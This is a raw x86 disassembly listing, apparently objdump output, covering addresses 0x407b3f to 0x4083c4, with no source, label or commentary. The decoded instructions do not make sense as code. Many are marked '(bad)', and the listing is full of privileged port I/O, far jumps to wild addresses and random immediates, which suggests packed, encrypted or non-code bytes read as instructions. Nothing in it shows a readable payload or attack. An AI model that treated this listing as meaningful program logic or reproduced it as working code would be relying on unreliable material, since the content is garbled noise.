  407b3f:	add    ebx,eax
  407b41:	or     dh,dl
  407b43:	add    al,0xf2
  407b45:	int    0xc1
  407b47:	mov    dl,0xca
  407b49:	out    0xb7,eax
  407b4b:	mov    edx,0xeef1b6db
  407b50:	ror    bl,cl
  407b52:	fdiv   st,st(4)
  407b54:	mov    eax,0xf8ddc7d7
  407b59:	out    0x3,eax
  407b5b:	mov    eax,0xc0fae4c2
  407b60:	or     BYTE PTR [eax],al
  407b62:	fcom   DWORD PTR [ebx]
  407b64:	in     eax,dx
  407b65:	mov    al,0xb0
  407b67:	mov    esi,0xf9b6d3b2
  407b6c:	out    0xb9,eax
  407b6e:	jmp    0xd5114e39
  407b73:	fdiv   st(4),st
  407b75:	loop   0x407b45
  407b77:	cld    
  407b78:	add    cl,ah
  407b7a:	loope  0x407b7e
  407b7c:	stc    
  407b7d:	add    al,0xeb
  407b7f:	out    dx,al
  407b80:	(bad)  
  407b82:	ror    DWORD PTR [ecx+edi*4],0xc1
  407b86:	test   al,0xeb
  407b88:	in     al,dx
  407b89:	mov    ah,0xee
  407b8b:	repz mov ebx,0xb9fed6d8
  407b91:	rcr    esp,1
  407b93:	into   
  407b94:	clc    
  407b95:	jecxz  0x407b75
  407b97:	(bad)  
  407b98:	cli    
  407b99:	(bad)  
  407b9a:	loop   0x407b74
  407b9c:	lock or ecx,ebx
  407b9f:	fld    DWORD PTR [eax+edi*8]
  407ba2:	(bad)  
  407ba4:	(bad)  
  407ba5:	repnz jmp 0xafb6:0xf5f6c1e1
  407bad:	fistp  QWORD PTR [eax-0xe2e4226]
  407bb3:	ret    
  407bb4:	hlt    
  407bb5:	add    bh,bl
  407bb7:	(bad)  
  407bb8:	fstp   TBYTE PTR [esi-0x16f62001]
  407bbe:	add    cl,ch
  407bc0:	aam    0xc5
  407bc2:	into   
  407bc3:	(bad)  
  407bc5:	test   esi,0xe7e7d7f0
  407bcb:	shr    ebp,1
  407bcd:	mov    dh,0xf7
  407bcf:	icebp  
  407bd0:	sar    DWORD PTR [ebp+edi*8-0x324472a],cl
  407bd7:	ror    ah,cl
  407bd9:	int3   
  407bda:	(bad)  
  407bdb:	jmp    0xecea:0xac7dac7
  407be2:	clc    
  407be3:	xcrypt-cbc (bad)
  407be4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407be5:	shl    eax,1
  407be7:	xlat   BYTE PTR ds:[ebx]
  407be8:	(bad)  
  407be9:	ret    
  407bea:	xlat   BYTE PTR ds:[ebx]
  407beb:	xlat   BYTE PTR ds:[ebx]
  407bec:	aad    0xee
  407bee:	test   ecx,0xfcefeeff
  407bf4:	stc    
  407bf5:	in     eax,dx
  407bf6:	out    0xfe,al
  407bf8:	clc    
  407bf9:	ror    BYTE PTR [ebx],0xeb
  407bfc:	cld    
  407bfd:	clc    
  407bfe:	(bad)  
  407bff:	add    cl,BYTE PTR [esi]
  407c01:	or     ebx,edx
  407c03:	stc    
  407c04:	ret    
  407c05:	ror    dl,0xf0
  407c08:	shl    ch,cl
  407c0a:	int    0xa8
  407c0c:	(bad)  
  407c0d:	retf   0xf8d2
  407c10:	les    esi,FWORD PTR [esi-0x11244112]
  407c16:	pop    es
  407c17:	loop   0x407bdb
  407c19:	hlt    
  407c1a:	add    DWORD PTR [ecx],ecx
  407c1c:	retf   
  407c1d:	in     al,0x0
  407c1f:	leave  
  407c20:	add    al,0xf4
  407c22:	or     eax,0xc0a8c3e3
  407c27:	fisubr WORD PTR [ebx-0x101d324d]
  407c2d:	mov    ch,0xd9
  407c2f:	jmp    0xf1bc:0xc8f2c9d1
  407c36:	out    dx,eax
  407c37:	out    0xe1,eax
  407c39:	mov    edx,0xc7d8dac0
  407c3e:	add    cl,ah
  407c40:	cld    
  407c41:	add    eax,DWORD PTR ds:0xbfb0bcc9
  407c47:	mov    dl,0xcd
  407c49:	mov    bl,0xca
  407c4b:	aam    0xb4
  407c4d:	jmp    0x407c14
  407c4f:	int3   
  407c50:	call   0xfc3b660d
  407c55:	out    dx,al
  407c56:	push   es
  407c57:	xlat   BYTE PTR ds:[ebx]
  407c58:	icebp  
  407c59:	push   es
  407c5a:	out    0xb,al
  407c5c:	or     esi,edi
  407c5e:	push   es
  407c5f:	add    eax,0xf3d9c9cd
  407c64:	fdiv   QWORD PTR [ecx-0x181a1d58]
  407c6a:	cmc    
  407c6b:	out    0xee,eax
  407c6d:	lock mov ah,0xf3
  407c70:	lock enter 0xedbd,0xbf
  407c75:	add    edx,edi
  407c77:	fdivr  st,st(7)
  407c79:	sti    
  407c7a:	add    eax,DWORD PTR [esi]
  407c7c:	call   0xf3a3a51
  407c81:	sti    
  407c82:	sti    
  407c83:	cld    
  407c84:	stos   BYTE PTR es:[edi],al
  407c85:	loop   0x407c56
  407c87:	retf   0xf0c4
  407c8a:	aad    0xed
  407c8c:	rol    al,0xee
  407c8f:	into   
  407c90:	in     eax,dx
  407c91:	lock mov esi,0xf9bde9c8
  407c97:	loope  0x407c9d
  407c99:	fcmovbe st,st(1)
  407c9b:	add    edi,DWORD PTR [edi-0x1001372a]
  407ca1:	cld    
  407ca2:	call   DWORD PTR [ebx]
  407ca4:	(bad)  
  407ca6:	rol    eax,1
  407ca8:	into   
  407ca9:	out    0xf2,al
  407cab:	out    0xb0,eax
  407cad:	stc    
  407cae:	(bad)  
  407caf:	out    0xb4,al
  407cb1:	jmp    0xccd8:0x1ced1c9
  407cb8:	loop   0x407c78
  407cba:	fild   DWORD PTR [esi]
  407cbc:	fdivr  st,st(2)
  407cbe:	pextrw esp,mm5,0xff
  407cc2:	invd   
  407cc4:	out    0xed,eax
  407cc6:	icebp  
  407cc7:	shl    ch,1
  407cc9:	mov    ah,0xf2
  407ccb:	sti    
  407ccc:	rcl    ah,cl
  407cce:	(bad)  
  407ccf:	mov    esi,0xbbecf3cd
  407cd4:	mov    edi,0xd6e7d4cc
  407cd9:	fcom   st(3)
  407cdb:	sar    esp,0xe3
  407cde:	fmul   st(1),st
  407ce0:	cli    
  407ce1:	fcmovb st,st(5)
  407ce3:	add    bl,ah
  407ce5:	ror    cl,cl
  407ce7:	mov    bh,0xd6
  407ce9:	mov    esp,0xe0d3c1cf
  407cee:	out    0xf4,al
  407cf0:	(bad)
  407cf3:	rcr    edx,cl
  407cf5:	cld    
  407cf6:	mov    ch,0x0
  407cf8:	sti    
  407cf9:	loope  0x407cd9
  407cfb:	(bad)  
  407cfc:	or     bh,BYTE PTR [esi+0xafbe7dc]
  407d02:	call   0xe4fe2f0d
  407d07:	retf   
  407d08:	int    0xe4
  407d0a:	(bad)  
  407d0b:	into   
  407d0c:	retf   0xe8fb
  407d0f:	(bad)  
  407d11:	clc    
  407d12:	mov    cl,0xd1
  407d14:	out    dx,al
  407d15:	mov    ecx,0xc1ffd4d7
  407d1a:	shl    ebp,1
  407d1c:	hlt    
  407d1d:	loopne 0x407ce9
  407d1f:	push   cs
  407d20:	call   0xdd4c7eed
  407d25:	in     eax,0xa8
  407d27:	in     eax,0xe4
  407d29:	loopne 0x407d26
  407d2b:	mov    ebx,0xf8f6f6cd
  407d30:	retf   
  407d31:	out    dx,al
  407d32:	iret   
  407d33:	mov    ah,0xf1
  407d35:	aad    0xb8
  407d37:	icebp  
  407d38:	add    eax,0xbf1fee1
  407d3d:	ret    0xddef
  407d40:	loopne 0x407d11
  407d42:	(bad)  
  407d44:	mov    cl,0xc2
  407d46:	repz xlat BYTE PTR ds:[ebx]
  407d48:	out    0xe2,al
  407d4a:	lods   eax,DWORD PTR ds:[esi]
  407d4b:	idiv   DWORD PTR [ebx-0x17480d25]
  407d51:	mov    eax,0xfae0f2f6
  407d56:	(bad)  
  407d57:	add    esi,edx
  407d59:	icebp  
  407d5a:	add    al,0x9
  407d5c:	add    eax,edx
  407d5e:	out    dx,eax
  407d5f:	add    BYTE PTR [edi],al
  407d61:	int3   
  407d62:	add    eax,0xd0cedc13
  407d67:	(bad)
  407d6a:	repz repnz in al,0xcd
  407d6e:	mov    eax,0xf9ead6eb
  407d73:	rol    DWORD PTR [ecx],1
  407d75:	into   
  407d76:	fsub   st,st(5)
  407d78:	loopne 0x407d85
  407d7a:	add    BYTE PTR [edx],al
  407d7c:	pop    es
  407d7d:	(bad)  
  407d7e:	(bad)  
  407d7f:	fcmovnu st,st(7)
  407d81:	pop    es
  407d82:	(bad)  
  407d83:	out    0xf1,al
  407d85:	test   edx,0xe1eae4ca
  407d8b:	stc    
  407d8c:	sar    DWORD PTR [ecx-0x354a1017],cl
  407d92:	(bad)  
  407d93:	in     eax,dx
  407d94:	aad    0xba
  407d96:	repnz (bad) 
  407d98:	repz (bad) 
  407d9b:	mov    eax,0x1e7d8e2
  407da0:	ffree  st(6)
  407da2:	add    edi,edx
  407da4:	shr    BYTE PTR [ecx-0x4336322d],cl
  407daa:	rol    al,cl
  407dac:	loopne 0x407d8e
  407dae:	leave  
  407daf:	into   
  407db0:	fidivr DWORD PTR [esi-0x12461309]
  407db6:	sti    
  407db7:	cld    
  407db8:	std    
  407db9:	push   es
  407dba:	in     al,0xe9
  407dbc:	out    0x8,al
  407dbe:	aad    0xe8
  407dc0:	add    esp,ecx
  407dc2:	in     al,0x7
  407dc4:	shr    BYTE PTR [ecx-0x53193336],1
  407dca:	not    dh
  407dcc:	iret   
  407dcd:	fptan  
  407dcf:	fidivr DWORD PTR [edi-0x1471037]
  407dd5:	in     al,dx
  407dd6:	clc    
  407dd7:	(bad)  
  407dd8:	mov    ebx,0x1f7c1c1
  407ddd:	enter  0xe0f8,0xdb
  407de1:	add    eax,0xeec0eb0f
  407de6:	div    ebp
  407de8:	div    bl
  407dea:	out    0xc4,eax
  407dec:	rol    al,cl
  407dee:	rcr    dl,cl
  407df0:	mov    ebx,0xfef9fcf1
  407df5:	loopne 0x407db3
  407df7:	add    esi,esp
  407df9:	add    al,0xc7
  407dfb:	or     eax,DWORD PTR [ebx]
  407dfd:	in     eax,0x6
  407dff:	inc    dh
  407e01:	push   cs
  407e02:	iret   
  407e03:	call   0xe3f32ed3
  407e08:	aam    0xc0
  407e0a:	into   
  407e0b:	int    0xb6
  407e0d:	icebp  
  407e0e:	hlt    
  407e0f:	(bad)  
  407e10:	int    0xcb
  407e12:	fild   DWORD PTR [edx]
  407e14:	loop   0x407dfd
  407e16:	ret    0xd9fd
  407e19:	idiv   ebx
  407e1b:	(bad)  
  407e1c:	retf   
  407e1d:	sar    al,0xca
  407e20:	push   es
  407e21:	(bad)  
  407e23:	in     eax,0xb9
  407e25:	shl    ecx,1
  407e27:	fstp   st(5)
  407e29:	ret    
  407e2a:	lods   eax,DWORD PTR ds:[esi]
  407e2b:	fcmovb st,st(1)
  407e2d:	ror    eax,1
  407e2f:	rcr    ecx,cl
  407e31:	cmc    
  407e32:	mov    esi,0x3d9fab9
  407e37:	loop   0x407e2d
  407e39:	(bad)  
  407e3a:	loopne 0x407df8
  407e3c:	jecxz  0x407e22
  407e3e:	hlt    
  407e3f:	(bad)  
  407e41:	push   cs
  407e42:	dec    BYTE PTR [eax]
  407e44:	rcr    edi,cl
  407e46:	mov    dl,0xf6
  407e48:	shr    ebx,1
  407e4a:	test   ah,0xcd
  407e4d:	stc    
  407e4e:	out    dx,al
  407e4f:	fcmovne st,st(4)
  407e51:	cld    
  407e52:	stc    
  407e53:	int3   
  407e54:	in     al,dx
  407e55:	(bad)  
  407e56:	out    dx,al
  407e57:	in     al,dx
  407e58:	mov    ebp,0xbf8fef6
  407e5d:	test   DWORD PTR [eax],0xc50d08c7
  407e63:	pop    es
  407e64:	test   eax,0xb5e9f3e4
  407e69:	(bad)  
  407e6a:	(bad)  
  407e6b:	int3   
  407e6c:	shr    ebp,0xe4
  407e6f:	lods   al,BYTE PTR ds:[esi]
  407e70:	in     eax,0xdd
  407e72:	clc    
  407e73:	loope  0x407e58
  407e75:	pop    es
  407e76:	mov    ecx,0xfff3dd07
  407e7b:	fcmovbe st,st(6)
  407e7d:	aad    0xdb
  407e7f:	retf   
  407e80:	add    ebp,edi
  407e82:	push   cs
  407e83:	out    dx,al
  407e84:	(bad)
  407e88:	mov    ch,0xe0
  407e8a:	out    dx,al
  407e8b:	jmp    0xba17775d
  407e90:	cmc    
  407e91:	mov    ecx,0xe2ccffbb
  407e96:	iret   
  407e97:	(bad)  
  407e98:	mov    ebp,0xe5d7d8fd
  407e9d:	ror    edx,0xdd
  407ea0:	sidtd  ds:0xf2ceccd9
  407ea7:	scas   eax,DWORD PTR es:[edi]
  407ea8:	les    esi,FWORD PTR [edi-0x18240436]
  407eae:	repz (bad) 
  407eb1:	cli    
  407eb2:	push   eax
  407eb4:	in     eax,dx
  407eb5:	pop    es
  407eb6:	sar    DWORD PTR [ebp-0x341dfe24],1
  407ebc:	fcmovnu st,st(4)
  407ebe:	out    0xdb,eax
  407ec0:	(bad)  
  407ec2:	ror    ebp,0xe0
  407ec5:	repz jmp 0x407e8c
  407ec8:	loop   0x407eac
  407eca:	rcl    edx,cl
  407ecc:	(bad)  
  407ece:	in     al,0xe9
  407ed0:	mov    bh,0xd6
  407ed2:	stc    
  407ed3:	add    edi,DWORD PTR [ebp-0x40471814]
  407ed9:	frndint 
  407edb:	cli    
  407edc:	retf   0xc0d0
  407edf:	add    ebp,esi
  407ee1:	jmp    0xb2cd:0xeec6cdea
  407ee8:	call   0xcd3859c1
  407eed:	(bad)  
  407eee:	(bad)  
  407ef0:	mov    edi,0xdfdcedd2
  407ef5:	mov    ecx,0xf8d5fadd
  407efa:	retf   
  407efb:	out    0xfb,al
  407efd:	aad    0xfa
  407eff:	leave  
  407f00:	int    0xec
  407f02:	add    al,0x13
  407f04:	lock scas eax,DWORD PTR es:[edi]
  407f06:	test   al,0xc2
  407f08:	loopne 0x407efe
  407f0a:	out    dx,al
  407f0b:	call   0xb6082df7
  407f10:	shl    BYTE PTR [ecx+esi*8-0x2f280328],cl
  407f17:	icebp  
  407f18:	jecxz  0x407ee0
  407f1a:	loopne 0x407f1c
  407f1c:	jmp    0x6db:0xe5cfe3df
  407f23:	or     eax,0xb3c8ccd0
  407f28:	cmc    
  407f29:	ror    dh,cl
  407f2b:	retf   
  407f2c:	retf   
  407f2d:	loopne 0x407ef9
  407f2f:	mov    eax,0xd2f2edce
  407f34:	sar    ebp,0xdf
  407f37:	cld    
  407f38:	idiv   esp
  407f3a:	hlt    
  407f3b:	xlat   BYTE PTR ds:[ebx]
  407f3c:	or     BYTE PTR [esi+0xde6df0a],bh
  407f42:	push   cs
  407f43:	stc    
  407f44:	lock out 0xc8,al
  407f47:	retf   
  407f48:	(bad)  
  407f49:	out    0xc6,eax
  407f4b:	mov    cl,0xf0
  407f4d:	int3   
  407f4e:	jmp    0xdbe8:0xefcfddf0
  407f55:	repnz pop es
  407f57:	clc    
  407f58:	xlat   BYTE PTR ds:[ebx]
  407f59:	out    0xe2,al
  407f5b:	retf   
  407f5c:	jmp    0xf04:0xed02e1f7
  407f63:	jmp    0x407f46
  407f65:	leave  
  407f66:	shr    bl,1
  407f68:	repnz in eax,0xac
  407f6b:	mov    edx,0xbfffaed4
  407f70:	hlt    
  407f71:	in     al,0xb9
  407f73:	fistp  QWORD PTR [ecx-0x2003410c]
  407f79:	sar    ch,0xe6
  407f7c:	std    
  407f7d:	rcl    dh,0xd8
  407f80:	fucom  st(1)
  407f82:	in     eax,0xec
  407f84:	repz fadd st(6),st
  407f87:	mov    ebp,0xb2f1b4bd
  407f8c:	mov    ecx,0xbfcdb7cb
  407f91:	mov    ebx,0xf6dcfcd7
  407f96:	rol    BYTE PTR [edx],cl
  407f98:	ret    0xe403
  407f9b:	mul    esi
  407f9d:	or     esi,esp
  407f9f:	cld    
  407fa0:	enter  0xedd8,0x9
  407fa4:	jmp    0xb22f337c
  407fa9:	loope  0x407f6e
  407fab:	call   0xb5307282
  407fb0:	mov    edi,0xd301ecf5
  407fb5:	rcr    ah,cl
  407fb7:	(bad)  
  407fb8:	pop    es
  407fb9:	cli    
  407fba:	lock add al,dl
  407fbd:	jmp    0xeee6:0xe5e1cf0e
  407fc4:	into   
  407fc5:	stos   BYTE PTR es:[edi],al
  407fc6:	rol    edx,0xb1
  407fc9:	in     al,0xb1
  407fcb:	rcl    ch,0xef
  407fce:	imul   dh
  407fd0:	fcomip st,st(3)
  407fd2:	mov    esp,0xb8ecc2e2
  407fd7:	ret    
  407fd8:	fsubrp st(0),st
  407fda:	jmp    0x407f9c
  407fdc:	(bad)  
  407fdd:	out    0xe4,eax
  407fdf:	cli    
  407fe0:	(bad)  
  407fe1:	fiadd  WORD PTR [ebx]
  407fe3:	out    dx,al
  407fe4:	into   
  407fe5:	shl    bh,0xcc
  407fe8:	in     eax,0xb5
  407fea:	mov    al,0xe6
  407fec:	icebp  
  407fed:	sti    
  407fee:	jmp    0xdb334de0
  407ff3:	mov    edx,0xf903e003
  407ff8:	jecxz  0x407feb
  407ffa:	(bad)  
  407ffc:	jmp    0xca2874c1
  408001:	jmp    edx
  408003:	fisubr DWORD PTR [edx-0x48513e3d]
  408009:	rol    edi,1
  40800b:	call   0xde396aca
  408010:	jmp    0x407fda
  408012:	mov    esi,0xd9b9bcf2
  408017:	in     eax,dx
  408018:	add    eax,0xe8e1f4d5
  40801d:	push   es
  40801e:	mov    BYTE PTR [ecx],0xce
  408021:	or     ecx,DWORD PTR [ecx]
  408023:	leave  
  408024:	mov    esi,0xe5e4b7d0
  408029:	rol    bh,1
  40802b:	int    0xf1
  40802d:	into   
  40802e:	mov    ah,0xd4
  408030:	repz aad 0xf7
  408033:	clc    
  408034:	fdiv   st(5),st
  408036:	mov    esp,0xbf0c706
  40803b:	mov    eax,0xe701de
  408040:	int    0xd4
  408042:	loope  0x408047
  408044:	icebp  
  408045:	loopne 0x408005
  408047:	mov    esi,0xb1fbdccf
  40804c:	aam    0xe8
  40804e:	out    dx,eax
  40804f:	jmp    0xf2f93928
  408054:	cld    
  408055:	repnz rcl al,0xff
  408059:	or     esp,esi
  40805b:	push   es
  40805c:	(bad)  
  40805d:	jmp    0xeb426339
  408062:	or     al,0xfe
  408064:	shr    BYTE PTR [eax-0x383b2c2d],1
  40806a:	shl    al,1
  40806c:	clc    
  40806d:	mov    cl,0xe9
  40806f:	int3   
  408070:	mov    ebx,0xe1cad3d1
  408075:	call   0xfe476773
  40807a:	mov    ebp,0xac4f9c4
  40807f:	iret   
  408080:	push   cs
  408081:	(bad)
  408084:	jmp    0xd22a4752
  408089:	(bad)  
  40808a:	cmc    
  40808b:	mov    edx,0xe5f8f3ce
  408090:	retf   
  408091:	mov    esi,0xd5dfec
  408096:	iret   
  408097:	lock rcr bl,0xda
  40809b:	not    ebp
  40809d:	retf   0xefef
  4080a0:	push   es
  4080a1:	fisttp QWORD PTR [eax]
  4080a3:	shl    DWORD PTR [edi-0x43083611],cl
  4080a9:	out    dx,eax
  4080aa:	xlat   BYTE PTR ds:[ebx]
  4080ab:	out    dx,al
  4080ac:	jmp    0xf9197298
  4080b1:	icebp  
  4080b2:	mov    cl,0xca
  4080b4:	shl    al,cl
  4080b6:	out    0xda,al
  4080b8:	loope  0x408076
  4080ba:	aam    0xe1
  4080bc:	add    eax,edx
  4080be:	add    al,bh
  4080c0:	jmp    0xe8b1:0xb207dee6
  4080c7:	retf   
  4080c8:	(bad)  
  4080c9:	div    BYTE PTR [ebx-0x37204e26]
  4080cf:	mov    ah,0xf3
  4080d1:	fidiv  WORD PTR [ebp-0x26493048]
  4080d7:	std    
  4080d8:	mov    ebp,0xf9ddc7eb
  4080dd:	fild   DWORD PTR [esi]
  4080df:	retf   0xfcd4
  4080e2:	std    
  4080e3:	in     eax,dx
  4080e4:	shl    edx,1
  4080e6:	mov    edi,0xf0c1cfee
  4080eb:	mov    dl,0xf2
  4080ed:	in     eax,0xca
  4080ef:	in     al,dx
  4080f0:	mov    edi,0xeebfd4e4
  4080f5:	cld    
  4080f6:	icebp  
  4080f7:	mov    eax,0xcb05bdf1
  4080fc:	add    ch,dh
  4080fe:	fmul   DWORD PTR ds:0xecc1effa
  408104:	loopne 0x4080ec
  408106:	shl    ebp,1
  408108:	loop   0x4080bf
  40810a:	loop   0x4080cc
  40810c:	mov    bl,0xc9
  40810e:	mov    ah,0xd6
  408110:	(bad)  
  408111:	aam    0xcf
  408113:	int    0xbc
  408115:	call   0xfe10820a
  40811a:	jecxz  0x4080f7
  40811c:	jecxz  0x4080df
  40811e:	retf   
  40811f:	(bad)  
  408120:	sti    
  408121:	dec    BYTE PTR [edx]
  408123:	or     al,0xc8
  408125:	lods   eax,DWORD PTR ds:[esi]
  408126:	div    ch
  408128:	(bad)  
  408129:	mov    bl,0xfb
  40812b:	ror    esp,cl
  40812d:	int    0xb7
  40812f:	icebp  
  408130:	retf   
  408131:	cli    
  408132:	fcom   st(7)
  408134:	(bad)  
  408136:	fptan  
  408138:	stc    
  408139:	inc    BYTE PTR [esi]
  40813b:	ret    0xd5
  40813e:	(bad)  
  408140:	in     al,dx
  408141:	out    dx,eax
  408142:	jmp    0xc1f1:0xafaef20d
  408149:	fmul   st(4),st
  40814b:	in     al,dx
  40814c:	mov    dl,0xdb
  40814e:	mov    dh,0xcf
  408150:	out    dx,eax
  408151:	call   0xde117419
  408156:	aad    0xb4
  408158:	add    eax,0xc7d2f6ba
  40815d:	call   0xf50e4223
  408162:	or     ah,ah
  408164:	lods   al,BYTE PTR ds:[esi]
  408165:	(bad)
  408168:	mov    esp,0xd4f2f7f0
  40816d:	shr    cl,cl
  40816f:	retf   
  408170:	mov    ah,0xbe
  408172:	retf   0xdcff
  408175:	inc    eax
  408177:	in     al,dx
  408178:	mov    esi,0xc7c1e1
  40817d:	loope  0x408149
  40817f:	add    eax,0xdf0cff0a
  408184:	shr    DWORD PTR [edx-0x11191637],0xc0
  40818b:	cmc    
  40818c:	cli    
  40818d:	fstp   TBYTE PTR [eax-0x463b2d42]
  408193:	retf   0xf0c9
  408196:	(bad)  
  408198:	ror    BYTE PTR [ebx],0x4
  40819b:	stc    
  40819c:	fld    st(7)
  40819e:	cmc    
  40819f:	dec    cl
  4081a1:	(bad)  
  4081a2:	into   
  4081a3:	or     eax,0xf7c5f3d2
  4081a8:	fnsave [edi+edx*8-0x7284520]
  4081af:	in     eax,dx
  4081b0:	xlat   BYTE PTR ds:[ebx]
  4081b1:	out    dx,al
  4081b2:	add    eax,DWORD PTR [edx]
  4081b4:	ret    0xe7ec
  4081b7:	mov    ebp,0xfbdde5df
  4081bc:	loopne 0x40819d
  4081be:	jmp    0xc50e:0xcc0fe8c5
  4081c5:	test   al,0xd1
  4081c7:	out    dx,al
  4081c8:	xlat   BYTE PTR ds:[ebx]
  4081c9:	retf   0xb1b2
  4081cc:	test   bh,0xc4
  4081cf:	neg    dl
  4081d1:	mov    edi,0xecdaf6f8
  4081d6:	test   bl,0xbb
  4081d9:	fimul  WORD PTR [edx]
  4081db:	in     eax,0xfb
  4081dd:	fucomp st(7)
  4081df:	cmc    
  4081e0:	(bad)  
  4081e1:	or     DWORD PTR [ebx],ecx
  4081e3:	add    eax,0xbccaf0a8
  4081e8:	loop   0x4081dd
  4081ea:	retf   
  4081eb:	cli    
  4081ec:	mov    dl,0xd9
  4081ee:	mov    eax,0xd4fcc5e9
  4081f3:	fdivr  DWORD PTR [edx-0x43323d21]
  4081f9:	(bad)  
  4081fc:	not    ch
  4081fe:	mov    ebp,0xeae00cd6
  408203:	or     dl,bl
  408205:	shr    ebx,0xf7
  408208:	int    0xf7
  40820a:	in     eax,0xe4
  40820c:	jmp    0xde167ade
  408211:	int3   
  408212:	not    edx
  408214:	repz into 
  408216:	rcl    ebx,0xfb
  408219:	(bad)  
  40821b:	cld    
  40821c:	fild   WORD PTR [ebx]
  40821e:	add    BYTE PTR [edx],cl
  408220:	call   0xcb47510b
  408225:	out    dx,eax
  408226:	ror    ebp,cl
  408228:	aam    0xf0
  40822a:	jecxz  0x4081e7
  40822c:	sti    
  40822d:	icebp  
  40822e:	clc    
  40822f:	mov    dh,0xd8
  408231:	(bad)  
  408233:	lock loopne 0x40820e
  408236:	icebp  
  408237:	loop   0x408206
  408239:	jecxz  0x4081fb
  40823b:	or     edx,esp
  40823d:	mov    BYTE PTR [edi],0xd5
  408240:	fucomp st(3)
  408242:	out    0xee,eax
  408244:	in     eax,dx
  408245:	in     al,dx
  408246:	retf   0xeeb3
  408249:	in     eax,0xd4
  40824b:	(bad)  
  40824c:	int    0xae
  40824e:	(bad)  
  40824f:	(bad)
  408252:	out    dx,eax
  408253:	rol    ebx,cl
  408255:	fdivr  st,st(3)
  408257:	fucom  st(2)
  408259:	hlt    
  40825a:	cld    
  40825b:	add    eax,0xae5ebde
  408260:	fcomp  st(4)
  408262:	push   cs
  408263:	adc    esp,esi
  408265:	faddp  st(6),st
  408267:	cmc    
  408268:	ret    
  408269:	shl    ch,0xa8
  40826c:	out    dx,al
  40826d:	out    dx,eax
  40826e:	(bad)  
  40826f:	(bad)  
  408270:	fstp   st(7)
  408272:	mov    esi,0xf3fedbc8
  408277:	jecxz  0x40826a
  408279:	ffree  st(4)
  40827b:	(bad)  
  40827c:	jmp    0xea3a5c66
  408281:	aam    0xe7
  408283:	stc    
  408284:	out    dx,eax
  408285:	jecxz  0x408272
  408287:	rol    dh,0xe9
  40828a:	sti    
  40828b:	mov    bl,0xc0
  40828d:	into   
  40828e:	enter  0xd5f4,0xdf
  408292:	fdivp  st(1),st
  408294:	call   edi
  408296:	ret    
  408297:	fcmovu st,st(5)
  408299:	int3   
  40829a:	(bad)  
  40829b:	(bad)  
  40829d:	out    dx,eax
  40829e:	retf   
  40829f:	leave  
  4082a0:	dec    ebp
  4082a2:	leave  
  4082a3:	or     esp,DWORD PTR [edi-0x370d2217]
  4082a9:	repnz mov ch,0xb6
  4082ac:	in     eax,0xe8
  4082ae:	jmp    0xf0f6:0xdeebcfe4
  4082b5:	fucomi st,st(4)
  4082b7:	(bad)  
  4082b8:	pop    es
  4082b9:	fcmovb st,st(3)
  4082bb:	add    eax,eax
  4082bd:	or     ch,bh
  4082bf:	leave  
  4082c0:	in     al,dx
  4082c1:	(bad)  
  4082c2:	dec    cl
  4082c4:	jmp    0xe0ef608d
  4082c9:	in     al,0xd6
  4082cb:	lods   al,BYTE PTR ds:[esi]
  4082cc:	mov    dl,0xe0
  4082ce:	in     al,dx
  4082cf:	jmp    0xf4f3:0xefdd03cd
  4082d6:	hlt    
  4082d7:	mov    eax,0xb8defdd9
  4082dc:	jmp    0xee1f4bdb
  4082e1:	add    ebx,ecx
  4082e3:	in     eax,dx
  4082e4:	ret    
  4082e5:	lods   eax,DWORD PTR ds:[esi]
  4082e6:	in     al,dx
  4082e7:	aad    0xae
  4082e9:	ror    dl,0xb0
  4082ec:	out    0xc8,eax
  4082ee:	(bad)
  4082f2:	mov    esp,0xdbbde0e8
  4082f7:	not    ecx
  4082f9:	push   es
  4082fa:	add    al,bh
  4082fc:	sti    
  4082fd:	or     ch,dh
  4082ff:	add    al,BYTE PTR [eax]
  408301:	jmp    0x4082e4
  408303:	loopne 0x4082f4
  408305:	loope  0x4082e5
  408307:	scas   eax,DWORD PTR es:[edi]
  408308:	(bad)
  40830b:	leave  
  40830c:	out    0xd4,eax
  40830e:	enter  0xb4c9,0xc9
  408312:	fidivr DWORD PTR [ebx-0x4b3d0709]
  408318:	ret    
  408319:	fsubrp st(3),st
  40831b:	std    
  40831c:	add    al,0xdc
  40831e:	(bad)  
  408320:	or     dl,ch
  408322:	out    0xeb,al
  408324:	ret    
  408325:	call   0xf4ec5613
  40832a:	aam    0xd9
  40832c:	aam    0xed
  40832e:	mov    dh,0xfb
  408330:	(bad)  
  408332:	std    
  408333:	hlt    
  408334:	stc    
  408335:	icebp  
  408336:	add    ah,dh
  408338:	mov    edi,0xfc07f7f5
  40833d:	cmc    
  40833e:	pop    es
  40833f:	loope  0x408342
  408341:	cld    
  408342:	out    dx,al
  408343:	or     al,al
  408345:	(bad)  
  408347:	jmp    0x40831b
  408349:	not    esp
  40834b:	(bad)  
  40834c:	cmc    
  40834d:	hlt    
  40834e:	fdivr  DWORD PTR [ebx-0xb07334c]
  408354:	call   0xd40e404b
  408359:	(bad)
  40835c:	jecxz  0x408368
  40835e:	call   0x9466a41
  408363:	into   
  408364:	scas   al,BYTE PTR es:[edi]
  408365:	lods   al,BYTE PTR ds:[esi]
  408366:	ror    ch,1
  408368:	out    dx,eax
  408369:	shr    edi,1
  40836b:	in     eax,0xf6
  40836d:	retf   0xc6e5
  408370:	in     al,0xba
  408372:	ret    
  408373:	mov    edi,0xe7defbd8
  408378:	in     eax,0x3
  40837a:	(bad)  
  40837c:	fadd   st(6),st
  40837e:	inc    DWORD PTR [ecx]
  408380:	enter  0xea0c,0xfe
  408384:	stos   BYTE PTR es:[edi],al
  408385:	mov    dl,0xc6
  408387:	rol    dl,cl
  408389:	out    0xca,al
  40838b:	hlt    
  40838c:	rcl    ebp,cl
  40838e:	mov    ah,0xfb
  408390:	aam    0xd9
  408392:	mov    esi,0xcedbd4b4
  408397:	mov    DWORD PTR [eax],0xc6fe0aec
  40839d:	add    BYTE PTR [edi],al
  40839f:	fnclex 
  4083a1:	(bad)  
  4083a2:	fdiv   st(7),st
  4083a4:	jecxz  0x408354
  4083a6:	ror    al,cl
  4083a8:	loop   0x408361
  4083aa:	icebp  
  4083ab:	lods   al,BYTE PTR ds:[esi]
  4083ac:	mov    ch,0xcf
  4083ae:	mov    dh,0xcb
  4083b0:	retf   0xc8db
  4083b3:	sar    DWORD PTR [edi-0xf1107ff],cl
  4083b9:	int3   
  4083ba:	(bad)  
  4083bb:	rcl    cl,1
  4083bd:	loop   0x4083bf
  4083bf:	psubsb mm3,mm4
  4083c2:	loopne 0x4083ab
  4083c4:	shl    ebp,0xe5
